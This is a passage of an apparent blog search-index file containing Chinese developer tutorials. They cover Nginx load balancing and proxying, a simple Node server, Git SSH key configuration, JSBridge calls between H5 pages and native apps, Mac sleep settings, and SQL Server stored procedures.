这里我配置了2台服务器，当然实际上是一台，只是端口不一样而已，而8081的服务器是不存在的,也就是说访问不到，但是我们访问http://localhost 的时候,也不会有问题，会默认跳转到http://localhost:8080 具体是因为Nginx会自动判断服务器的状态，如果服务器处于不能访问（服务器挂了），就不会跳转到这台服务器，所以也避免了一台服务器挂了影响使用的情况，由于Nginx默认是RR策略，所以我们不需要其他更多的设置\n2、权重 指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 例如\nupstream test { server localhost:8080 weight=9; server localhost:8081 weight=1; } 那么10次一般只会有1次会访问到8081，而有9次会访问到8080\n3、ip_hash 上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题\nupstream test { ip_hash; server localhost:8080; server localhost:8081; } 4、fair（第三方） 按后端服务器的响应时间来分配请求，响应时间短的优先分配\nupstream backend { fair; server localhost:8080; server localhost:8081; } 5、url_hash（第三方） 按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法\nupstream backend { hash $request_uri; hash_method crc32; server localhost:8080; server localhost:8081; } 以上5种负载均衡各自适用不同情况下使用，所以可以根据实际情况选择使用哪种策略模式,不过fair和url_hash需要安装第三方模块才能使用，由于本文主要介绍Nginx能做的事情，所以Nginx安装第三方模块不会再本文介绍\nHTTP服务器 Nginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现，首先看看Nginx做静态资源服务器\nserver { listen 80; server_name localhost; client_max_body_size 1024M; location / { root e:wwwroot; index index.html; } } 这样如果访问http://localhost 就会默认访问到E盘wwwroot目录下面的index.html，如果一个网站只是静态页面的话，那么就可以通过这种方式来实现部署\n动静分离 动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路\nupstream test{ server localhost:8080; server localhost:8081; } server { listen 80; server_name localhost; location / { root e:wwwroot; index index.html; } # 所有静态请求都由nginx处理，存放目录为html location ~ .(gif|jpg|jpeg|png|bmp|swf|css|js)$ { root e:wwwroot; } # 所有动态请求都转发给tomcat处理 location ~ .(jsp|do)$ { proxy_pass http://test; } error_page 500 502 503 504 /50x.html; location = /50x.html { root e:wwwroot; } } 这样我们就可以吧HTML以及图片和css以及js放到wwwroot目录下，而tomcat只负责处理jsp和请求，例如当我们后缀为gif的时候，Nginx默认会从wwwroot获取到当前请求的动态图文件返回，当然这里的静态文件跟Nginx是同一台服务器，我们也可以在另外一台服务器，然后通过反向代理和负载均衡配置过去就好了，只要搞清楚了最基本的流程，很多配置就很简单了，另外localtion后面其实是一个正则表达式，所以非常灵活\n正向代理 正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理，但是目前Nginx有一个问题，那么就是不支持HTTPS，虽然我百度到过配置HTTPS的正向代理，但是到最后发现还是代理不了，当然可能是我配置的不对，所以也希望有知道正确方法的同志们留言说明一下\nresolver 114.114.114.114 8.8.8.8; server { resolver_timeout 5s; listen 81; access_log e:wwwrootproxy.access.log; error_log e:wwwrootproxy.error.log; location / { proxy_pass http://$host$request_uri; } } resolver是配置正向代理的DNS服务器，listen 是正向代理的端口，配置好了就可以在ie上面或者其他代理插件上面使用服务器ip+端口号进行代理了\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/backend-develop/nginx-whatcando/","summary":"\u003cp\u003enode 作为当前最受欢迎的\u0026quot;js版\u0026quot;后端开发语言之一，无论是业务开发，还是自动化构建部署，使用是很频繁的。但是\u0026hellip;\u003c/p\u003e","title":"Nginx: 能够做什么"},{"content":"node 作为当前最受欢迎的\u0026quot;js版\u0026quot;后端开发语言之一，无论是业务开发，还是自动化构建部署，使用是很频繁的。但是\u0026hellip;\nNode: 最简单的node server 项目结构 主要文件:\nbin/www package.json 确定并安装node $ node -v bin/www var http = require(\u0026#39;http\u0026#39;); var port = 8000; /** * var app = require(\u0026#39;../app\u0026#39;); * var server = http.createServer(app); */ var data = { key: \u0026#39;hello\u0026#39;, value: \u0026#39;world\u0026#39;}; var server = http.createServer(function(request,response){ response.writeHead(200,{ \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; }); response.write(\u0026#39;Hello World -- 0\u0026#39;); response.end(JSON.stringify(data)); }); server.listen(port); console.log(\u0026#39;Server running on port 8000\u0026#39;); package.json 可以参考配置scripts\n{ \u0026#34;name\u0026#34;: \u0026#34;node-server\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A project that introduces simple node services\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;node ./bin/www\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;lianpf\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34; } 如果不想增加更多配置, 可以命令行 node ./bin/www 不用配置package.json\n启动 $ npm run start //启动server 浏览器直接访问 localhost:8000 , 可以看到response返回数据\n拓展 注意看项目结构的同学肯定注意到了没有提到app.js文件, 以及bin/www 文件里注释的app相关的代码, 这里要讲的是app.js是一个配置文件, 可以配置router等相关信息。然后启动node server, 提供接口服务。 这里贴下我之前项目app.js的配置, 有兴趣的同学自己参考拓展\nvar express = require(\u0026#39;express\u0026#39;); var session=require(\u0026#39;express-session\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var favicon = require(\u0026#39;serve-favicon\u0026#39;); var logger = require(\u0026#39;morgan\u0026#39;); var cookieParser = require(\u0026#39;cookie-parser\u0026#39;); var bodyParser = require(\u0026#39;body-parser\u0026#39;); var routes = require(\u0026#39;./routes/index\u0026#39;); var users = require(\u0026#39;./routes/users\u0026#39;); var connect_more=require(\u0026#39;./routes/connect_more\u0026#39;); var find = require(\u0026#39;./routes/find\u0026#39;); var hero = require(\u0026#39;./routes/hero\u0026#39;); var about_me = require(\u0026#39;./routes/about_me\u0026#39;); var app = express(); //app.set设置view engine 为ejs //app请求index，users var connect=require(\u0026#39;connect\u0026#39;); //app.use设置路由，/分配给routes，/users分配给users // view engine setup app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); // uncomment after placing your favicon in /public //app.use(favicon(path.join(__dirname, \u0026#39;public\u0026#39;, \u0026#39;favicon.ico\u0026#39;))); app.use(logger(\u0026#39;dev\u0026#39;)); app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: false })); app.use(cookieParser()); app.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); //app.use设置session回话，单位为毫秒全局变量。 //session 时长为30分钟,这个是以毫秒为单位,这样我们就建立一个session的会话，这是一个全局的设置 app.use(session({ secret: \u0026#39;joke\u0026#39;, key: \u0026#39;joke_key\u0026#39;,cookie: {maxAge: 1800000 }})); app.use(\u0026#39;/\u0026#39;, routes); app.use(\u0026#39;/users\u0026#39;, users); app.use(\u0026#39;/connect_more\u0026#39;,connect_more); app.use(\u0026#39;/find\u0026#39;,find); app.use(\u0026#39;/hero\u0026#39;,hero); app.use(\u0026#39;/about_me\u0026#39;,about_me); // catch 404 and forward to error handler app.use(function(req, res, next) { var err = new Error(\u0026#39;Not Found\u0026#39;); err.status = 404; next(err); }); // error handlers // development error handler // will print stacktrace if (app.get(\u0026#39;env\u0026#39;) === \u0026#39;development\u0026#39;) { app.use(function(err, req, res, next) { res.status(err.status || 500); res.render(\u0026#39;error\u0026#39;, { message: err.message, error: err }); }); } // production error handler // no stacktraces leaked to user app.use(function(err, req, res, next) { res.status(err.status || 500); res.render(\u0026#39;error\u0026#39;, { message: err.message, error: {} }); }); Date.prototype.Format = function (fmt) { //author: meizz var o = { \u0026#34;M+\u0026#34;: this.getMonth() + 1, //月份 \u0026#34;d+\u0026#34;: this.getDate(), //日 \u0026#34;h+\u0026#34;: this.getHours(), //小时 \u0026#34;m+\u0026#34;: this.getMinutes(), //分 \u0026#34;s+\u0026#34;: this.getSeconds(), //秒 \u0026#34;q+\u0026#34;: Math.floor((this.getMonth() + 3) / 3), //季度 \u0026#34;S\u0026#34;: this.getMilliseconds() //毫秒 }; if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + \u0026#34;\u0026#34;).substr(4 - RegExp.$1.length)); for (var k in o) if (new RegExp(\u0026#34;(\u0026#34; + k + \u0026#34;)\u0026#34;).test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : ((\u0026#34;00\u0026#34; + o[k]).substr((\u0026#34;\u0026#34; + o[k]).length))); return fmt; }; module.exports = app; 注 项目github地址 https://github.com/Wayshower/node-server\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-simpleserver/","summary":"\u003cp\u003enode 作为当前最受欢迎的\u0026quot;js版\u0026quot;后端开发语言之一，无论是业务开发，还是自动化构建部署，使用是很频繁的。但是\u0026hellip;\u003c/p\u003e","title":"Node: 最简单的node server"},{"content":"git 作为当前最受欢迎的版本控制软件，使用是很频繁的。但是\u0026hellip;\ngit 作为当前最受欢迎的版本控制软件，使用是很频繁的。但是有的小伙伴发现每次使用 git push 等操作时都要输入密码，实在是麻烦。这里对使用 SSH 与 HTTPS 两种通讯协议介绍一下免密码配置\n一、本地Git基本信息配置 本地Git用户名、邮箱等基本信息配置\ni. 查看\n验证『当前本地』是否已配置账号信息\n$ git config --list # 查看所有 $ git config --global --list # 查看当前用户(global)配置 $ git config --system --list # 查看系统config $ git config --local --list # 查看当前仓库配置信息 # 查看指定信息 $ git config user.name $ git config user.email ii. 增删改\n第一次配置，需要设置Git的user name和email\n# 新增或覆盖 $ git config --global user.name \u0026#34;lian\u0026#34; # you name $ git config --global user.email \u0026#34;lian@foxmail.com\u0026#34; # you email # 替换 $ git config --global --replace-all user.name \u0026#34;yourName\u0026#34; $ git config --global --replace-all user.email \u0026#34;your@email.com\u0026#34; # 删除 $ git config --global --unset user.name \u0026#34;yourName\u0026#34; $ git config --global --unset user.email \u0026#34;your@email.com\u0026#34; 二、ssh key和https差异 clone项目: 使用ssh方式时，首先你必须是该项目的管理者或拥有者，并且需要配置个人的ssh key。而对于使用https方式来讲，就没有这些要求。 push:在使用ssh方式时，是不需要验证用户名和密码，如果你在配置ssh key时设置了密码，则需要验证密码。而对于使用https方式来讲，每次push都需要验证用户名和密码。 三、配置ssh key 1. 单个ssh key生成及配置 1.1 生成密钥 ssh-keygen程序在Linux/Mac系统上由SSH包提供，而在Windows上则包含在MSysGit包里\n$ ssh-keygen -t rsa -C \u0026#34;lian@foxmail.com\u0026#34; 直接Enter，会提示你输入密码，如下(可不输，建议输入，安全性更高)：\nEnter same passphrase again: [Type passphrase again] 『本地的密钥对』生成完成提示：\nYour public key has been saved in /home/you/.ssh/id_rsa.pub. The key fingerprint is: # 01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db lian@foxmail.com 得到两个文件：id_rsa和id_rsa.pub。不是第一次，则选择overwrite\n1.2 检查是否存在ssh key $ cd ~/.ssh $ cd ~/.ssh \u0026amp;\u0026amp; ls # 进入且查看 id_rsa：密钥 id_rsa.pub：有.pub后缀的文件就是公钥，另一个文件则是。 1.3 添加公钥到远程仓库（github、gitLab 等) 查看公钥\n$ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAAAQC0X6L1zLL4VHuvGb8aJH3ippTozmReSUzgntvk434aJ ... 6J0GFlBVQeTE/IGqhMS5PMln3 lian@foxmail.com 添加公钥到远程仓库 以gitHub为例，登录进入个人中心，打开Settings -\u0026gt; SSH Keys，复制公钥内容到『key文本域』内\n如果公钥复制正确, 『title域』会自动将you email代入, 便于标识，你可以修改为其他的名字\n用ssh命令分别测试\nssh -T git@github.com 2. 多个SSH-Key配置 当有多个『git账号』时，比如：一个gitLab，用于公司内的工作开发。一个github，用于个人的一些开发方向。\n2.1 生成ssh key # 生成一个gitlab用的SSH-Key $ ssh-keygen -t rsa -C \u0026#39;xxxxx@company.com\u0026#39; -f ~/.ssh/id_rsa_gitlab # 生成一个github用的SSH-Key $ ssh-keygen -t rsa -C \u0026#39;xxxxx@qq.com\u0026#39; -f ~/.ssh/id_rsa_github 2.2 生成config配置文件 ~/.ssh目录下新建一个config文件\n$ cd ~/.ssh # 为.ssh目录设置权限 .ssh $ chmod 600 ~/.ssh/config config文件，添加如下内容：\nHost和HostName填写git服务器的域名 IdentityFile指定私钥的路径 # gitLab Host gitLab.com HostName gitLab.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa_gitlab # github Host github.com HostName github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa_github 2.3 用ssh命令分别测试 $ ssh -T git@gitLab.com $ ssh -T git@github.com 以gitHub为例，成功返回如下内容：\n$ ssh -T git@github.com Hi lianpf! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. 四、HTTPS 通信协议 待更新\u0026hellip;g\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/other/gitconfigs-ssh-https/","summary":"\u003cp\u003egit 作为当前最受欢迎的版本控制软件，使用是很频繁的。但是\u0026hellip;\u003c/p\u003e","title":"Git: ssh key、https 配置及用户名、邮箱基本信息配置"},{"content":"H5和native利用JSBridge交互，其中涉及到了一些和ios交互的callHandler框架，WebViewJavascriptBridge相关的原理还待补充\u0026hellip;\n一.基本用法使用 bridge文件 bridge文件是原生调用native的基础，大致需要这么几步完成: 1.建立AppClient对象\nfunction AppClient(appObj, isAndroid) { this.appObj = appObj; this.isAndroid = isAndroid; }; 2.建立js文件调用native的方法\nAppClient.prototype.closePage = function() { if (this.isAndroid) { this.appObj.closePageAction(); } else { this.appObj.callHandler(\u0026#34;closePageAction\u0026#34;); } } 注：closePage()就是js文件调用native关闭页面的方法，\u0026ldquo;closePageAction\u0026quot;是native端暴露给js端关闭 页面的操作。\njs调用文件 1.init AppClient对象\nif(window.android) { appClient = new AppClient(window.android, true); // 此处可以调用一些init的方法 } else { function setupWebViewJavascriptBridge(callback) { if (window.WebViewJavascriptBridge) { return callback(WebViewJavascriptBridge); } if (window.WVJBCallbacks) { return window.WVJBCallbacks.push(callback); } window.WVJBCallbacks = [callback]; var WVJBIframe = document.createElement(\u0026#39;iframe\u0026#39;); WVJBIframe.style.display = \u0026#39;none\u0026#39;; WVJBIframe.src = \u0026#39;https://__bridge_loaded__\u0026#39;; document.documentElement.appendChild(WVJBIframe); setTimeout(function() { document.documentElement.removeChild(WVJBIframe) }, 0) } setupWebViewJavascriptBridge(function(bridge) { appClient = new AppClient(bridge, false); // 此处可以调用一些init的方法 }); } 2.调用，依旧closePage()为例：\nappClient.closePage(); 二.重点 数据 1.native存在多线程，所以在js端h5页面在获取接口数据时，需要设置ajax异步(以jQuery为例：async：true) 2.js实现异步的几种途径： (1) 在异步获取数据成功之后，再去继续下一步操作，以jQuery为例： 在success回调函数里面，执行接下来的操作\n$.ajax({ headers: { Accept: \u0026#34;application/json; charset=utf-8\u0026#34;, basicParams: JSON.stringify(appData), }, url:staticUrl + url, type:\u0026#39;POST\u0026#39;, dataType:\u0026#34;json\u0026#34;, data: params, async:true, cache:false, contentType:\u0026#39;application/json\u0026#39;, processData:false, success:function(data){ // 你的下一步操作 }, error:function(data){ console.log(\u0026#34;---出现错误---\u0026#34;+ JSON.stringify(data)); } }); (2)ES6原生提供的Promise对象，将异步操作以同步操作的流程表达出来\nvar promise = new Promise(function(resolve, reject) { if (/* 异步操作成功 */){ resolve(value); } else { reject(error); } }); promise.then(function(value) { // success 你的下一步操作 }, function(value) { // failure }); js端调用native需要native回传数据 1.定义native回调js端的函数 (1)invokeJsPassCompanyCodeAndName()即native调用js的函数，必须放在window全局对象下, 否则native可能会调不到； (2)ios端利用callHandler框架回传的数据只能是json对象的形式\nwindow.invokeJsPassCompanyCodeAndName = function(_params) { companyCode = _params.companyCode; companyName = _params.companyName; var jsonStr = \u0026#34;\u0026#34;; getSign(jsonStr); } 2.js端调用native\nappClient.getSignedParams(\u0026#34;jsDataAction\u0026#34;, jsDataAction, ajaxRequestStr); 注：三个参数（callbackName, callback, params）回调函数名称，回调函数，给native传的参数\n3.bridge文件\nAppClient.prototype.getSignedParams = function (callbackName, callback, jsonStr) { var dataParams = \u0026#34;\u0026#34;; if(isJson(jsonStr)){ dataParams = JSON.parse(jsonStr); } var iOSData = { from: \u0026#39;H5\u0026#39;, params: dataParams }; if (this.isAndroid) { this.appObj.getSignedParamsAction(\u0026#39;H5\u0026#39;, jsonStr); } else { this.appObj.callHandler(\u0026#34;getSignedParamsAction\u0026#34;, iOSData, callback); } }; 注：利用callHandler给native传参数时，iOSData必须是一个json对象\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/frontend-develop/mobile-native-bridge/","summary":"\u003cp\u003eH5和native利用JSBridge交互，其中涉及到了一些和ios交互的callHandler框架，WebViewJavascriptBridge相关的原理还待补充\u0026hellip;\u003c/p\u003e","title":"移动端: H5和native利用JsBridge交互"},{"content":"使用Mac过程中遇到的一些问题记录\u0026hellip;\n一、系统配置 1.合上盖子不休眠的问题 硬件：MacBook Pro (13-inch, 2017, Four Thunderbolt 3 Ports) 系统版本：macOS High Sierra 10.13.6 问题：升级了新系统Sierra后出现”合上盖子竟没有休眠，第二天早上起来发现掉了50%多的电，而且温度堪比暖宝宝”\n解决：\n电源参数不匹配导致 打开terminal终端，输入pmset -g custom检查电源参数\n分别检查 Battery Power电池 和 AC Power电源适配器参数下的 displaysleep，sleep，和disksleep参数，要求时间的长度：sleep\u0026gt;=displaysleep\u0026gt;=disksleep。若没有遵循此规则，三个参数之间的时间冲突会导致mac在电池状态下没有正常进入休眠\ndisplaysleep: Mac闲置多长时间后进入显示器睡眠，单位是分钟，这个时间不能长于sleep下设置的时间 sleep: Mac闲置多长时间后进入睡眠，这个系统偏好设置里也有，单位是分钟 disksleep: Mac闲置多长时间后关闭硬盘。这个配置需要在系统偏好里勾选“如果可能，使硬盘进入睡眠”，系统会自动根据sleep的时间设一个合适的时间。单位是秒，这个时间不能长于sleep下设置的时间 修改以上参数，则需要：\n“系统偏好设置-\u0026gt;节能-\u0026gt;电池”去修改Battery Power电池下的参数 “系统偏好设置-\u0026gt;节能-\u0026gt;电源适配器”去修改AC Power电源适配器下的参数 注意：Battery Power电池 和 AC Power电源适配器三个参数均要符合sleep\u0026gt;=displaysleep\u0026gt;=disksleep规则，否则无法正常进入休眠\n其他导致无法休眠的原因及解决办法 可能下载了某些软件会在mac合上盖子还会唤醒mac从而阻止休眠，这时候打开活动监视器然后点能耗查看，把防止睡眠中如果有程序是“是”就改成“否” 重置SMC 如果还不行，在terminal终端输入pmset -g assertions 可以查看日志，查出是什么程序唤醒，然后关闭 如何重置SMC： 第一步：Mac关机 第二步：内键键盘操作 选中键盘左侧的Shift键、Control键、Option(Alt)键 在按住以上全部三个按键的前提下，按住电源按钮，且保持10秒 第三步：松开所有按键，然后按下电源按键将Mac开机。 二、软件系统 1.系统版本升级 官方文档-high Sierra\n系统版本升级\n检查硬件和系统版本兼容性\n2.系统降级 macOS 重装系统 Mojave | 降级mac OS\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/mac-system-env-config/","summary":"\u003cp\u003e使用Mac过程中遇到的一些问题记录\u0026hellip;\u003c/p\u003e","title":"Mac系统/软件版本配置问题汇总"},{"content":"项目开发中，经常遇到div元素自适应等高的问题，最近简单的做了一些总结\u0026hellip;\n存储过程，非常类似于Java中的方法，它可以重复调用。当存储过程执行一次后，可以将语句缓存中，这样下次执行的时候直接使用缓存中的语句。这样就可以提高存储过程的性能。\n存储过程的概念\n存储过程Procedure是一组为了完成特定功能的SQL语句集合，经编译后存储在数据库中，用户通过指定存储过程的名称并给出参数来执行。 存储过程中可以包含逻辑控制语句和数据操纵语句，它可以接受参数、输出参数、返回单个或多个结果集以及返回值。 由于存储过程在创建时即在数据库服务器上进行了编译并存储在数据库中，所以存储过程运行要比单个的SQL语句块要快。同时由于在调用时只需用提供存储过程名和必要的参数信息，所以在一定程度上也可以减少网络流量、简单网络负担。 1、 存储过程的优点 A、 存储过程允许标准组件式编程 存储过程创建后可以在程序中被多次调用执行，而不必重新编写该存储过程的SQL语句。而且数据库专业人员可以随时对存储过程进行修改，但对应用程序源代码却毫无影响，从而极大的提高了程序的可移植性。 B、 存储过程能够实现较快的执行速度 如果某一操作包含大量的T-SQL语句代码，分别被多次执行，那么存储过程要比批处理的执行速度快得多。因为存储过程是预编译的，在首次运行一个存储过程时，查询优化器对其进行分析、优化，并给出最终被存在系统表中的存储计划。而批处理的T-SQL语句每次运行都需要预编译和优化，所以速度就要慢一些。 C、 存储过程减轻网络流量 对于同一个针对数据库对象的操作，如果这一操作所涉及到的T-SQL语句被组织成一存储过程，那么当在客户机上调用该存储过程时，网络中传递的只是该调用语句，否则将会是多条SQL语句。从而减轻了网络流量，降低了网络负载。 D、 存储过程可被作为一种安全机制来充分利用 系统管理员可以对执行的某一个存储过程进行权限限制，从而能够实现对某些数据访问的限制，避免非授权用户对数据的访问，保证数据的安全。 Ø 系统存储过程\n系统存储过程是系统创建的存储过程，目的在于能够方便的从系统表中查询信息或完成与更新数据库表相关的管理任务或其他的系统管理任务。系统存储过程主要存储在master数据库中，以“sp”下划线开头的存储过程。尽管这些系统存储过程在master数据库中，但我们在其他数据库还是可以调用系统存储过程。有一些系统存储过程会在创建新的数据库的时候被自动创建在当前数据库中。 常用系统存储过程有： exec sp_databases; \u0026ndash;查看数据库 exec sp_tables; \u0026ndash;查看表 exec sp_columns student;\u0026ndash;查看列 exec sp_helpIndex student;\u0026ndash;查看索引 exec sp_helpConstraint student;\u0026ndash;约束 exec sp_stored_procedures; exec sp_helptext \u0026lsquo;sp_stored_procedures\u0026rsquo;;\u0026ndash;查看存储过程创建、定义语句 exec sp_rename student, stuInfo;\u0026ndash;修改表、索引、列的名称 exec sp_renamedb myTempDB, myDB;\u0026ndash;更改数据库名称 exec sp_defaultdb \u0026lsquo;master\u0026rsquo;, \u0026lsquo;myDB\u0026rsquo;;\u0026ndash;更改登录名的默认数据库 exec sp_helpdb;\u0026ndash;数据库帮助，查询数据库信息 exec sp_helpdb master;\n系统存储过程示例： \u0026ndash;表重命名 exec sp_rename \u0026lsquo;stu\u0026rsquo;, \u0026lsquo;stud\u0026rsquo;; select * from stud; \u0026ndash;列重命名 exec sp_rename \u0026lsquo;stud.name\u0026rsquo;, \u0026lsquo;sName\u0026rsquo;, \u0026lsquo;column\u0026rsquo;; exec sp_help \u0026lsquo;stud\u0026rsquo;; \u0026ndash;重命名索引 exec sp_rename N\u0026rsquo;student.idx_cid\u0026rsquo;, N\u0026rsquo;idx_cidd\u0026rsquo;, N\u0026rsquo;index\u0026rsquo;; exec sp_help \u0026lsquo;student\u0026rsquo;;\n\u0026ndash;查询所有存储过程 select * from sys.objects where type = \u0026lsquo;P\u0026rsquo;; select * from sys.objects where type_desc like \u0026lsquo;%pro%\u0026rsquo; and name like \u0026lsquo;sp%\u0026rsquo;;\nØ 用户自定义存储过程\n1、 创建语法\ncreate proc | procedure pro_name [{@参数数据类型} [=默认值] [output], {@参数数据类型} [=默认值] [output], \u0026hellip;. ] as SQL_statements\n2、 创建不带参数存储过程\n\u0026ndash;创建存储过程 if (exists (select * from sys.objects where name = \u0026lsquo;proc_get_student\u0026rsquo;)) drop proc proc_get_student go create proc proc_get_student as select * from student;\n\u0026ndash;调用、执行存储过程 exec proc_get_student;\n3、 修改存储过程\n\u0026ndash;修改存储过程 alter proc proc_get_student as select * from student;\n4、 带参存储过程\n\u0026ndash;带参存储过程 if (object_id(\u0026lsquo;proc_find_stu\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_find_stu go create proc proc_find_stu(@startId int, @endId int) as select * from student where id between @startId and @endId go\nexec proc_find_stu 2, 4;\n5、 带通配符参数存储过程\n\u0026ndash;带通配符参数存储过程 if (object_id(\u0026lsquo;proc_findStudentByName\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_findStudentByName go create proc proc_findStudentByName(@name varchar(20) = \u0026lsquo;%j%\u0026rsquo;, @nextName varchar(20) = \u0026lsquo;%\u0026rsquo;) as select * from student where name like @name and name like @nextName; go\nexec proc_findStudentByName; exec proc_findStudentByName \u0026lsquo;%o%\u0026rsquo;, \u0026rsquo;t%\u0026rsquo;;\n6、 带输出参数存储过程\nif (object_id(\u0026lsquo;proc_getStudentRecord\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_getStudentRecord go create proc proc_getStudentRecord( @id int, \u0026ndash;默认输入参数 @name varchar(20) out, \u0026ndash;输出参数 @age varchar(20) output\u0026ndash;输入输出参数 ) as select @name = name, @age = age from student where id = @id and sex = @age; go\n\u0026ndash; declare @id int, @name varchar(20), @temp varchar(20); set @id = 7; set @temp = 1; exec proc_getStudentRecord @id, @name out, @temp output; select @name, @temp; print @name + \u0026lsquo;#\u0026rsquo; + @temp;\n7、 不缓存存储过程\n\u0026ndash;WITH RECOMPILE 不缓存 if (object_id(\u0026lsquo;proc_temp\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_temp go create proc proc_temp with recompile as select * from student; go\nexec proc_temp;\n8、 加密存储过程\n\u0026ndash;加密WITH ENCRYPTION if (object_id(\u0026lsquo;proc_temp_encryption\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_temp_encryption go create proc proc_temp_encryption with encryption as select * from student; go\nexec proc_temp_encryption; exec sp_helptext \u0026lsquo;proc_temp\u0026rsquo;; exec sp_helptext \u0026lsquo;proc_temp_encryption\u0026rsquo;;\n9、 带游标参数存储过程\nif (object_id(\u0026lsquo;proc_cursor\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_cursor go create proc proc_cursor @cur cursor varying output as set @cur = cursor forward_only static for select id, name, age from student; open @cur; go \u0026ndash;调用 declare @exec_cur cursor; declare @id int, @name varchar(20), @age int; exec proc_cursor @cur = @exec_cur output;\u0026ndash;调用存储过程 fetch next from @exec_cur into @id, @name, @age; while (@@fetch_status = 0) begin fetch next from @exec_cur into @id, @name, @age; print \u0026lsquo;id: \u0026rsquo; + convert(varchar, @id) + \u0026lsquo;, name: \u0026rsquo; + @name + \u0026lsquo;, age: \u0026rsquo; + convert(char, @age); end close @exec_cur; deallocate @exec_cur;\u0026ndash;删除游标\n10、 分页存储过程\n\u0026mdash;存储过程、row_number完成分页 if (object_id(\u0026lsquo;pro_page\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_cursor go create proc pro_page @startIndex int, @endIndex int as select count(*) from product ; select * from ( select row_number() over(order by pid) as rowId, * from product ) temp where temp.rowId between @startIndex and @endIndex go \u0026ndash;drop proc pro_page exec pro_page 1, 4 \u0026ndash;分页存储过程 if (object_id(\u0026lsquo;pro_page\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc pro_stu go create procedure pro_stu( @pageIndex int, @pageSize int ) as declare @startRow int, @endRow int set @startRow = (@pageIndex - 1) * @pageSize +1 set @endRow = @startRow + @pageSize -1 select * from ( select *, row_number() over (order by id asc) as number from student ) t where t.number between @startRow and @endRow;\nexec pro_stu 2, 2;\nØ Raiserror\nRaiserror返回用户定义的错误信息，可以指定严重级别，设置系统变量记录所发生的错误。\n语法如下：\nRaiserror({msg_id | msg_str | @local_variable} {, severity, state} [,argument[,…n]] [with option[,…n]] )\nmsg_id:在sysmessages系统表中指定的用户定义错误信息 msg_str:用户定义的信息，信息最大长度在2047个字符。 severity：用户定义与该消息关联的严重级别。当使用msg_id引发使用sp_addmessage创建的用户定义消息时，raiserror上指定严重性将覆盖sp_addmessage中定义的严重性。 任何用户可以指定0-18直接的严重级别。只有sysadmin固定服务器角色常用或具有alter trace权限的用户才能指定19-25直接的严重级别。19-25之间的安全级别需要使用with log选项。 state：介于1至127直接的任何整数。State默认值是1。 raiserror(\u0026lsquo;is error\u0026rsquo;, 16, 1); select * from sys.messages; \u0026ndash;使用sysmessages中定义的消息 raiserror(33003, 16, 1); raiserror(33006, 16, 1);\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 